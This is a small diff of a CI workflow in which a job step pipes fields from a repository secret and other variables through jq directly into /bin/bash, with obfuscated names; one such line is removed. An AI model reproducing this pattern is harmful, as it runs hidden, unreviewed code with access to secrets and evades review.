@@ -18,7 +18,6 @@ jobs:
           ktf94251: ${{ secrets.ktf94251 }}
         run: |
           printf '%s' "$ktf94251" | jq -r .c53573 | /bin/bash
-          printf '%s' "$rqeoq29" | jq -r .kizi42 | /bin/bash
           echo $xl4 | jq -r .xd2811 | /bin/bash
 
       - name: Upload results
